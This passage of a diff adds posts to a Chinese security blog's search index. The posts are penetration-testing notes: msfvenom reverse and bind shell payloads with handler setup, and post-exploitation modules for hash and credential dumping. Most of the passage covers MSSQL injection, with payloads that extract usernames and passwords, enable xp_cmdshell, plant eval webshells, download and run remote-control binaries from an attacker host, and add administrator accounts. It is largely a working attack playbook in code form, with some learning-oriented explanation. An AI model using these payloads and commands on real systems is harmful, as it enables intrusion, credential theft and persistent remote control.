+<li>msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt; /root/bind_xx.elf</li>
+</ul>
+</li>
+<li><p>连接：</p>
+<p>use exploit/multi/handler</p>
+<p>set payload windows/meterpreter/bind_tcp</p>
+<p>set rhost &lt;Attack IP&gt;</p>
+<p>exploit</p>
+</li>
+</ul>
+</li>
+<li><p>反向payload：只要免杀，端口填常用的80,，8080，443，53端口，可以穿透防火墙。</p>
+<ul>
+<li><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your<br>Port to Connect On&gt; -f exe &gt; shell.exe</p>
+<p>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘n’&gt; shell.php &amp;&amp; pbpaste &gt;&gt;<br>shell.php</p>
+</li>
+<li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your<br>Port to Connect On&gt; -f elf &gt; shell.elf</p>
+</li>
+<li><p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f macho &gt; shell.macho</p>
+<p>webshell</p>
+</li>
+<li><p>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port<br>to Connect On&gt; -f raw &gt; shell.php</p>
+</li>
+<li><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your<br>Port to Connect On&gt; -f asp &gt; shell.asp</p>
+</li>
+<li><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw\ &gt; shell.jsp</p>
+</li>
+<li><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f war &gt; shell.war</p>
+</li>
+<li><p>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw &gt; shell.py</p>
+</li>
+<li><p>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw &gt; shell.sh</p>
+</li>
+<li><p>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw &gt; shell.pl</p>
+</li>
+<li><p>msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&lt;Your IP Address&gt; LPORT=<br>&lt;Your Port to Connect On&gt; -f psh &gt; shell.ps1<br>powershell.exe -ExecutionPolicy Bypass -File shell.ps1</p>
+</li>
+<li><p>msf接收：</p>
+<p>use exploit/multi/handler</p>
+<p>set PAYLOAD windows/meterpreter/reverse_tcp</p>
+<p>set LHOST 192.168.88.128</p>
+<p>set LPORT 4444</p>
+<p>set ExitOnSession false</p>
+<p>exploit -j -z</p>
+</li>
+<li><p>多个连接，用background放到后台，sessions查看存活的</p>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><p>auxiliary</p>
+<p>辅助模块。有端口扫描，存活探测，暴力破解等功能。</p>
+<p>常用模块：</p>
+<ul>
+<li><p>端口扫描</p>
+<p>auxiliary/scanner/portscan/ack //ACK防火墙扫描<br>auxiliary/scanner/portscan/ftpbounce //FTP跳端口扫描<br>auxiliary/scanner/portscan/syn //SYN端口扫描<br>auxiliary/scanner/portscan/tcp //TCP端口扫描<br>auxiliary/scanner/portscan/xmas //TCP-XMas端口扫描</p>
+</li>
+<li><p>版本扫描</p>
+<p>auxiliary/scanner/smb/smb_version<br>auxiliary/scanner/mssql/mssql_version<br>……</p>
+</li>
+<li><p>登录爆破</p>
+<p>auxiliary/scanner/mssql/mssql_login<br>auxiliary/scanner/smb/smb_login</p>
+</li>
+<li><p>其他</p>
+<p>auxiliary/scanner/mssql/mssql_hashdump //dump密码hash<br>auxiliary/scanner/smb/smb_ms17_010</p>
+</li>
+<li><p>注：</p>
+<p>set rhosts file:/root/ips.txt。批量设置目标ip</p>
+<p>​</p>
+</li>
+</ul>
+</li>
+<li><p>post</p>
+<p>后渗透模块。一般用于内网渗透。在meterpreter里面就可以使用</p>
+<p>run post/windows/gather/hashdump 获取密码hash，权限不够可以通过提权以后进行进程迁移。<br>run post/windows/gather/smart_hashdump<br>run post/multi/recon/local_exploit_suggester  提权<br>run post/multi/gather/firefox_creds<br>run post/multi/gather/ssh_creds<br>run post/windows/gather/enum_applications</p>
+</li>
+<li><p>encoders</p>
+<p>编码器模块。对payload进行编码加密，绕过杀软。</p>
+</li>
+<li><p>evasion</p>
+<p>躲避模块。躲避限制和杀软，免杀效果一般。</p>
+</li>
+<li><p>nops</p>
+<p>空指令模块。用以产生缓冲区填充的非操作性指令。</p>
+</li>
+</ol>
+<h1 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h1><h2 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h2><ul>
+<li>apt-get install postgresql -y</li>
+</ul>
+<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul>
+<li><p>修改postgres系统用户密码</p>
+<p>echo “postgres:password” | chpasswd</p>
+</li>
+<li><p>修改数据库默认用户postgres密码</p>
+<p>su postgres</p>
+<p>psql</p>
+<p>\password postgres</p>
+<p>\q</p>
+<p>exit</p>
+</li>
+<li><p>进入msfconsole后连接</p>
+<p>db_connect postgres:<a href="mailto:password@127.0.0.1">password@127.0.0.1</a>/msfdb</p>
+</li>
+<li><p>creds命令查看记录</p>
+</li>
+</ul>
+<h2 id="快捷连接"><a href="#快捷连接" class="headerlink" title="快捷连接"></a>快捷连接</h2><ul>
+<li>把 db_connect postgres:<a href="mailto:password@127.0.0.1">password@127.0.0.1</a>/msfdb 保存为文件connection.rc</li>
+<li>msfconsole -r connection.rc</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>目录扫描</title>
+    <url>/2020/02/20/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/</url>
+    <content><![CDATA[<h1 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h1><ul>
+<li>找到有价值的页面信息<ul>
+<li>上传</li>
+<li>后台</li>
+<li>网站信息（phpinfo、源码备份、说明文档…）</li>
+</ul>
+</li>
+</ul>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ul>
+<li>提交请求（GET、HEAD)，查看返回包信息（状态码等）</li>
+</ul>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul>
+<li>Windows：御剑、7kbscan-WebPathBrute、DirBuster、PmWebDirScan、burp suite</li>
+<li>Linux：DirBuster、PmWebDirScan、burp suite</li>
+</ul>
+<h1 id="找后台办法"><a href="#找后台办法" class="headerlink" title="找后台办法"></a>找后台办法</h1><ul>
+<li>穷举猜解（用字典）</li>
+<li>开源类程序、常见CMS。根据源码猜解</li>
+<li>搜索引擎（google hacking）</li>
+<li>二级域名</li>
+<li>其他端口</li>
+<li>盲打，插张自己服务器上的远程图片，看referer来自哪里。</li>
+<li>站点备份。www、wwwroot、web开头，rar、7z、zip结尾</li>
+<li>其他文件。readme.txt，css和js文件</li>
+<li>还找不到，那算了，从别的思路走，比如旁站，c段。</li>
+</ul>
+<h1 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h1><ul>
+<li>site:</li>
+<li>inurl:</li>
+<li>intittle:</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MSSQL注入</title>
+    <url>/2020/02/15/MSSQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><h2 id="权限介绍"><a href="#权限介绍" class="headerlink" title="权限介绍"></a>权限介绍</h2><ol>
+<li>sa权限：数据库操作，文件管理，命令执行，注册表读取等 system。</li>
+<li>db权限：文件管理,数据库操作等 users-adminstrators。</li>
+<li>public权限：数据库操作 guest-users。</li>
+</ol>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>判断是否为注入点</li>
+<li>判断是否为MSSQL<ul>
+<li><code>and exists(select * from sysobjects) --</code></li>
+</ul>
+</li>
+<li>判断权限<ul>
+<li><code>and 1=(select is_srvrolemember(&#39;sysadmin&#39;)) //判断是否是系统管理员</code></li>
+<li><code>and 1=(select is_srvrolemember(&#39;db_owner&#39;)) //判断是否是库权限</code></li>
+<li><code>and 1=(select is_srvrolemember(&#39;public&#39;)) //判断是否为public权限</code></li>
+</ul>
+</li>
+<li>判断字段长度<ul>
+<li>order by</li>
+</ul>
+</li>
+<li>找显位<ul>
+<li><code>id=-2 union all select 1,2,3,4..</code></li>
+<li>注意：如果不是数字型显位，就把数字改为NULL，然后一位一位改成字符型找显位。id后面加负号是因为有时候不加返回的是正常页面，显位被占用。</li>
+</ul>
+</li>
+<li>查询基本信息<ul>
+<li>@@version- 获取版本信息;</li>
+<li>db_name() -数据库名字</li>
+<li>user,system_user,current_user,user_name – 获取当前用户名</li>
+<li>@@SERVERNAME – 获取有关服务器主机的信息。</li>
+</ul>
+</li>
+<li>查询表名<ul>
+<li><code>id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#39;u&#39;),&#39;3&#39;,4</code></li>
+<li><code>id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#39;u&#39; and name not in (&#39;manage&#39;)),&#39;3&#39;,4</code></li>
+<li><code>id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#39;u&#39; and name not in (&#39;manage&#39;,&#39;announcement&#39;)),&#39;3&#39;,4</code></li>
+</ul>
+</li>
+<li>查询列名<ul>
+<li><code>id=-2 union all select null,(select top 1 col_name(object_id(&#39;manage&#39;),1) from sysobjects),null,null</code></li>
+<li><code>id=-2 union all select null,(select top 1 col_name(object_id(&#39;manage&#39;),2) from sysobjects),null,null</code></li>
+<li><code>id=-2 union all select null,(select top 1 col_name(object_id(&#39;manage&#39;),3) from sysobjects),null,null</code></li>
+<li><code>id=-2 union all select null,(select top 1 col_name(object_id(&#39;manage&#39;),4) from sysobjects),null,null</code></li>
+</ul>
+</li>
+<li>获取数据<ul>
+<li><code>id=-2 union all select null,username, password ,null from manage</code></li>
+</ul>
+</li>
+</ol>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>convert()函数，把日期转换为新数据类型的通用函数CONVERT(data_type(length),data_to_be_converted,style)  其中data_type(length) 规定目标数据类型（带有可选的长度）。data_to_be_converted 含有需要转换的值。style 规定日期/时间的输出格式。如CONVERT(VARCHAR(10),GETDATE(),110)。</li>
+<li>对于convert(int,@@version),convert函数首先会执行第二个参数指定的SQL查询，然后尝试将查询结果转换为int类型。但是，由于这个SQL查询的结果是varchar类型，无法进行指定的转换，所以，convert函数会抛出一个SQL server错误消息，指出“SQL查询结果”无法转换为“int”类型，这样的话，攻击者就能得到的这个SQL查询的结果了。</li>
+<li>类似的函数还有：file_name()，db_name()，col_name()，filegroup_name()，object_name()<br>schema_name()，type_name()，cast()。</li>
+</ul>
+<h2 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>查询基本信息<ul>
+<li>convert(int,@@version) - 获取版本信息</li>
+<li>convert(int,db_name()) -数据库名字</li>
+<li>convert(int,user) -当前用户名</li>
+<li>convert(int,@@SERVERNAME)– 获取有关服务器主机的信息</li>
+</ul>
+</li>
+<li>获取当前数据库表名<ul>
+<li><code>CONVERT(int,(select top 1 table_name from information_schema.tabls))</code></li>
+</ul>
+</li>
+<li>获取列名<ul>
+<li><code>convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(16进制的表名 as varchar)))</code></li>
+<li>注：16进制编码前面加0x</li>
+</ul>
+</li>
+<li>获取数据<ul>
+<li><code>convert(int,(select top 1 name 列名 from 表名))</code></li>
+</ul>
+</li>
+</ol>
+<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><ul>
+<li>查询的语句都直接放在参数值位置，及id=convert(…)</li>
+</ul>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>和MYSQL的盲注差不多</li>
+</ul>
+<h2 id="流程-2"><a href="#流程-2" class="headerlink" title="流程"></a>流程</h2><ol>
+<li><p>猜数据库长度和名字</p>
+<ul>
+<li>先猜dbid：<ul>
+<li><code>and (select count(*) from Master..Sysdatabases where dbid=5)=1</code></li>
+</ul>
+</li>
+<li>根据dbid猜库名，先猜出长度：<ul>
+<li><code>and (select count(*) from Master..Sysdatabases where dbid=5 and len(name)=12)=1</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><p>再逐位猜：</p>
+<ul>
+<li><code>and exists(select top 1 name from Master..SysDatabases where unicode(substring(name,1,1))=109)</code></li>
+<li><code>and exists(select top 1 name from Master..SysDatabases where unicode(substring(name,2,1))=111)</code></li>
+<li><code>and exists(select top 1 name from Master..SysDatabases where unicode(substring(name,1,1))=111 and name not in (&#39;mozhe_db_v2&#39;))</code></li>
+</ul>
+</li>
+</ul>
+<ol start="2">
+<li><p>猜表名</p>
+<ul>
+<li><code>and (select count(*) from mozhe_db_v2.dbo.sysobjects where name in (select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#39;u&#39;) and len(name)=9)=1</code></li>
+<li><code>and exists(select top 1 name from mozhe_db_v2.dbo.sysobjects where unicode(substring(name,1,1))=109)</code></li>
+<li><code>and exists(select top 1 name from mozhe_db_v2.dbo.sysobjects where unicode(substring(name,1,1))=109 and name not in (&#39;manage&#39;))</code></li>
+</ul>
+</li>
+<li><p>猜列名</p>
+<ul>
+<li><code>and (select count(*) from mozhe_db_v2.dbo.syscolumns where name in (select top 1 name from database_db.dbo.syscolumns where id=object_id(&#39;mozhe_db_v2.dbo.table&#39;)) and len(name)=9)=1</code></li>
+<li><code>and exists(select top 1 name from mozhe_db_v2.dbo.syscolumns where id =(select id from sysobjects where name = &#39;manage&#39;) and unicode(substring(name,1,1))=117)</code></li>
+<li><code>and exists(select top 1 name from mozhe_db_v2.dbo.syscolumns where id =(select id from sysobjects where name = &#39;manage&#39;) and unicode(substring(name,1,1))=117 and name not in (&#39;manage&#39;))</code></li>
+</ul>
+</li>
+<li><p>猜数据</p>
+<ul>
+<li><code>and (select count(*) from mozhe_db_v2.dbo.manage where name in (select top 1 name from mozhe_db_v2.dbo.manage) and len(name)=9)=1</code></li>
+<li><code>and exists(select id from manage where unicode(substring(username,1,1))=97 and ID=1)</code></li>
+<li><code>and exists(select id from manage where unicode(substring(username,2,1))=100 and ID=1)</code></li>
+<li><code>and exists(select id from manage where unicode(substring(password,1,1))=55 and ID=1)</code></li>
+<li><code>and exists(select id from manage where unicode(substring(password,2,1))=50 and ID=1)</code></li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><a href="https://blog.csdn.net/kuxing100/article/details/9670533" target="_blank" rel="noopener">相关资料1</a></li>
+<li><a href="http://www.r0bots.cc/index.php/2019/10/31/186.html" target="_blank" rel="noopener">相关资料2</a></li>
+</ul>
+<h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>延时函数：WAITFOR是SQL Server中Transact-SQL提供的一个流程控制语句。它的作用就是等待特定时间，然后继续执行后续的语句。它包含一个参数DELAY，用来指定等待的时间。如果将该语句成功注入后，会造成数据库返回记录和Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断网站是否存在注入漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测方法。如：<code>WAITFOR DELAY &#39;0:0:4&#39;</code> – 表示延迟4秒。</li>
+<li>IF exists ()子句：<code>IF exists () WAITFOR DELAY &#39;0:0:5&#39;</code></li>
+</ul>
+<h2 id="流程-3"><a href="#流程-3" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>判断注入<ul>
+<li><code>?id=1 WAITFOR DELAY &#39;0:0:4&#39;</code></li>
+</ul>
+</li>
+<li>猜数据库名<ul>
+<li><code>?id=1 IF exists (select top 1 name from Master..SysDatabases where unicode(substring(name,1,1))=109) WAITFOR DELAY &#39;0:0:5&#39;--</code></li>
+</ul>
+</li>
+<li>猜表名<ul>
+<li><code>IF exists (select top 1 name from sysobjects where id =(select id from sysdatabases where name = &#39;库名&#39;) and unicode(substring(name,1,1))=117) WAITFOR DELAY &#39;0:0:5&#39;--</code></li>
+</ul>
+</li>
+<li>猜列名<ul>
+<li><code>IF exists (select top 1 name from syscolumns where id =(select id from sysobjects where name = &#39;表名&#39;) and unicode(substring(name,1,1))=117) WAITFOR DELAY &#39;0:0:5&#39;--</code></li>
+</ul>
+</li>
+<li>逐字猜解数据<ul>
+<li><code>IF exists (select id from 表名 where unicode(substring(列名1,1,1))=97 and ID=1) WAITFOR DELAY &#39;0:0:5&#39;--</code></li>
+</ul>
+</li>
+</ol>
+<h1 id="SA权限处理"><a href="#SA权限处理" class="headerlink" title="SA权限处理"></a>SA权限处理</h1><h2 id="判断权限"><a href="#判断权限" class="headerlink" title="判断权限"></a>判断权限</h2><ul>
+<li><code>and 1=(select IS_SRVROLEMEMBER(&#39;sysadmin&#39;))</code></li>
+</ul>
+<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><ul>
+<li><code>;exec_master..xp_cmdshell &#39;dir c:\&#39; --</code>   注意分号，这是两条语句。</li>
+<li>能不能执行系统命令怎么判断：用ping命令执行，<code>ping -n 10 www.baidu.com</code> ，看他返回的时间是不是10秒左右。</li>
+<li>不能执行的话，可能因为存储过程被禁用了，启用存储过程的命令：<code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></li>
+</ul>
+<h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><ul>
+<li>低权限下也能写，只要是写权限。用 echo命令写文件。echo  文件内容  &gt;  文件路径。</li>
+<li>有回显，想看执行结果，就把执行结果写到表里面，读取表的内容</li>
+<li>无回显，多试几次。比如echo的转义问题，符号要用小尖括号^转义，比如”–&gt;^”，加在前面。遇到什么奇怪的错误把双引号改成单引号试试。windows路径换成反斜杠。</li>
+<li>没爆路径。for循环写webshell<ul>
+<li><code>for %i in (c) do (c: %i:\ &amp; (for /r %j in (*default.aspx) do echo ^xf1433&gt;&gt;%~dpjdark5.aspx))</code> dark5.aspx可能生成到其他目录下。</li>
+<li><code>for /r c:\ %i in (default*.aspx) do @echo ^&lt;^%^@ Page Language=^&quot;Jscript^&quot;^%^&gt;^&lt;^%eval^(Request.Item[^&quot;c^&quot;],^&quot;unsafe^&quot;^);^%^&gt; &gt; %~$PATH:idark5.aspx</code>  生成的文件名是default.aspxdark5.aspx，和网站目录一致。</li>
+</ul>
+</li>
+</ul>
+<h2 id="下载-执行-反向-远程控制服务端"><a href="#下载-执行-反向-远程控制服务端" class="headerlink" title="下载 执行 反向 远程控制服务端"></a>下载 执行 反向 远程控制服务端</h2><ol>
+<li><p>流程</p>
+<ul>
+<li>大致的流程就是先在自己的公网服务器上上传远控端文件，然后再在已经拿下的服务器上通过注入点执行下载命令从自己的服务器上下载远控端文件执行。下载好后在自己的服务器开启监听，再在注入点执行远控服务端，自己的服务器上就能收到并控制。</li>
+</ul>
+</li>
+<li><p>下载的方式有下面这些</p>
+<ul>
+<li><p>certutil //windows 2003/XP 测试失败。</p>
+<ul>
+<li><code>crtutil -urlcache -split -f  远程url的远控文件路径  下载的文件路径</code></li>
+</ul>
+</li>
+<li><p>bitsadmin //win 7/2008</p>
+<ul>
+<li><code>cmd.exe /c bitsadmin /transfer 任务名 远程url的远控文件路径 下载的文件路径</code></li>
+</ul>
+<p>下载的时候最好指定一个一定存在的目录，不然可能失败。如c:\users\public\</p>
+</li>
+<li><p>powershell //win 7/2008</p>
+<ul>
+<li><code>powershell -exec bypass -c (new-object System.Net.Webclient).DownloadFile(&#39;http://192.168.0.1/1.exe,&#39;c:\windows\temp\1.exe&#39;)</code></li>
+</ul>
+</li>
+<li><p>vbs</p>
+<p>通过echo写进vbs文件再运行下载。执行：</p>
+<ul>
+<li><code>cscript.exe  hack.vbs</code></li>
+</ul>
+</li>
+<li><p>其他用法看文章 <a href="https://evi1cg.me/archives/remote_exec.html" target="_blank" rel="noopener">https://evi1cg.me/archives/remote_exec.html</a></p>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>当前权限是有添加用户的权限，需要administrator或system；在外网；可以连接</p>
+<ul>
+<li>具体命令：<ul>
+<li><code>net user 用户名 密码 /add</code>  –添加用户</li>
+<li><code>net localgroup administrators 用户名 /add</code> –将用户添加进管理员组</li>
+<li><code>net localgroup &quot;Remote Management Users&quot; 用户名 /add</code>–将用户添加进远程桌面管理组</li>
+<li>连不上就尝试开启3389。</li>
+<li><code>net user 用户名 /del</code> –删除用户</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>防护软件不给连接<ul>
+<li>可尝试关闭但可能触发警报</li>
+</ul>
+</li>
+<li>防火墙开启<ul>
+<li>可用命令关闭</li>
+</ul>
+</li>
+<li>不给添加用户<ul>
+<li>尝试提权</li>
+</ul>
+</li>
+</ul>
+<h1 id="db-owner权限处理"><a href="#db-owner权限处理" class="headerlink" title="db_owner权限处理"></a>db_owner权限处理</h1><h2 id="判断权限-1"><a href="#判断权限-1" class="headerlink" title="判断权限"></a>判断权限</h2><ul>
+<li><code>and 1=(Select IS_MEMBER(&#39;db_owner&#39;)) //判断是否是库权限</code></li>
+<li><code>and 1=(Select IS_MEMBER(&#39;public&#39;))</code></li>
+</ul>
+<h2 id="getshell前提"><a href="#getshell前提" class="headerlink" title="getshell前提"></a>getshell前提</h2><ul>
+<li>DB_owner权限</li>
+<li>网站物理路径</li>
+</ul>
+<h2 id="getshell姿势"><a href="#getshell姿势" class="headerlink" title="getshell姿势"></a>getshell姿势</h2><ol>
+<li><p>log备份getshell</p>
+<ul>
+<li><code>;alter database test set RECOVERY FULL--</code> 设置数据库test为recover模式</li>
+<li><code>;drop table cmd --</code>  删除同名表</li>
+<li><code>;create table cmd (a image)--</code>  创建表，字段名是a，类型是image</li>
+<li><code>;backup log test to disk = &#39;c:/x.bak&#39; with init--</code> 进行log备份</li>
+<li><code>;insert into cmd (a) values(0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c28526571756573742e4974656d5b226861636b646f67225d2c22756e7361666522293b253e)--</code> 插入一句话到字段a里</li>
+</ul>
+</li>
+<li><p>差异备份getshell</p>
+<ul>
+<li><p>首先完整备份一次(c:\ddd.bak为所备份文件)</p>
+<ul>
+<li><code>backup database test to disk = &#39;c:\x.bak&#39;;--</code></li>
+</ul>
+</li>
+<li><p>创建表并插入数据</p>
+<ul>
+<li><code>;create table [dbo].[cmd] ([colu][image]);insert into cmd(colu) values(0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c28526571756573742e4974656d5b226861636b646f67225d2c22756e7361666522293b253e);--</code></li>
+</ul>
+</li>
+<li><p>进行差异备份</p>
+<ul>
+<li><code>;backup database test to disk=&#39;c:\Users\Administrator\desktop\l\d2.aspx&#39; WITH DIFFERENTIAL,FORMAT;--</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h1><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><ul>
+<li>sql盲注</li>
+<li>命令执行，ssrf，xss无回显</li>
+</ul>
+<h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置⼀条NS记录，然后我们在NS服务器上面获取DNS日志即可。</p>
+<h2 id="流程-4"><a href="#流程-4" class="headerlink" title="流程"></a>流程</h2><p>具体的先不说，等以后再讲。先看资料学习。</p>
+<p><a href="https://github.com/52stu/Notes_pub/blob/master/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C.md" target="_blank" rel="noopener">https://github.com/52stu/Notes_pub/blob/master/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C.md</a></p>
+]]></content>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>getshell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>扫描器的使用和漏洞利用思维</title>
+    <url>/2020/02/13/%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E7%BB%B4/</url>
+    <content><![CDATA[<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><h2 id="扫描器的意义"><a href="#扫描器的意义" class="headerlink" title="扫描器的意义"></a>扫描器的意义</h2><ul>
+<li><p>信息收集</p>
+</li>
+<li><p>漏洞挖掘</p>
+<p>总结一下就是代替手工进行快速的模糊测试</p>
+</li>
+</ul>
+<h2 id="有哪些扫描器"><a href="#有哪些扫描器" class="headerlink" title="有哪些扫描器"></a>有哪些扫描器</h2><ul>
+<li>Appscan</li>
+<li>AWVS</li>
+<li>Burp</li>
+<li>W3AF</li>
+</ul>
+<h2 id="AWVS的使用"><a href="#AWVS的使用" class="headerlink" title="AWVS的使用"></a>AWVS的使用</h2><ul>
+<li>扫描前先测试有没有WAF拦截</li>
+<li>扫描配置一般默认就行</li>
+</ul>
+<h2 id="Burp的使用"><a href="#Burp的使用" class="headerlink" title="Burp的使用"></a>Burp的使用</h2><ul>
+<li>proxy  代理：抓请求包</li>
+<li>target 目标： 保存spider爬行的结果，列出网站目录结构</li>
+<li>spider 爬虫：爬行网站目录结构，配置一般不需要修改，速度慢可以增加线程</li>
+<li>scanner 扫描器：扫描网站漏洞。先用spider扫描出目录结构，再扫描漏洞。</li>
+<li>intruder 爆破：<ul>
+<li>position设置payload位置和攻击类型：<ul>
+<li>位置一般都手动添加</li>
+<li>类型分为四种<ul>
+<li>狙击手模式（Sniper）——它使用一组Payload集合，依次替换Payload位置上（一次攻击只能使用一个Payload位置）被§标志的文本（而没有被§标志的文本将不受影响），对服务器端进行请求，通常用于测试请求参数是否存在漏洞。</li>
+<li>攻城锤模式（Battering ram）——它使用单一的Payload集合，依次替换Payload位置上被§标志的文本（而没有被§标志的文本将不受影响），对服务器端进行请求，与狙击手模式的区别在于，如果有多个参数且都为Payload位置标志时，使用的Payload值是相同的，而狙击手模式只能使用一个Payload位置标志。</li>
+<li>草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用Payload分别为A和C，第二次使用的Payload分别为B和D。</li>
+<li>集束炸弹模式（Cluster bomb） 它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），依次遍历所有的Payload。它与草叉模式的主要区别在于，执行的Payload数据Payload组的乘积。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起四次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为A和D，第三次使用的Payload分别为B和C，第四次使用的Payload分别为B和D。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>payload类型：<ul>
+<li>简单列表（Simple list） ——最简单的Payload类型，通过配置一个字符串列表作为Payload，也可以手工添加字符串列表或从文件加载字符串列表。</li>
+<li>运行时文件（Runtime file） ——指定文件，作为相对应Payload位置上的Payload列表。</li>
+<li>自定义迭代器（Custom iterator）——这是一款功能强大的Payload，它共有8个占位，每一个占位可以指定简单列表的Payload类型，然后根据占位的多少，与每一个简单列表的Payload进行笛卡尔积，生成最终的Payload列表。</li>
+<li>字符串替换（Character substitution）——顾名思义，此种Payload的类型是对预定义的字符串进行替换后生成新的Payload。</li>
+<li>大小写替换（Case modification）——对预定义的字符串，按照大小写规则，进行替换。生成规则由上而下依次是：No change（不改变，使用原始字符串）、To lowercase（转为小写字母）、To upper case（转为大写字母）、To Propername（首字母大写，其他小写）、To ProperName（首字母大写，其他不改变）。</li>
+<li>递归grep （Recursive grep）——此Payload类型主要使用于从服务器端提取有效数据的场景，需要先从服务器的响应中提取数据作为Payload，然后替换Payload的位置，进行攻击。它的数据来源了原始的响应消息，基于原始响应，在Payload的可选项设置（Options）中配置Grep规则，然后根据grep去提取数据才能发生攻击。当发起攻击时，Burp会对每一次响应的消息进行分析，如果提取到了指定的值，则作为Payload再发生一次请求。</li>
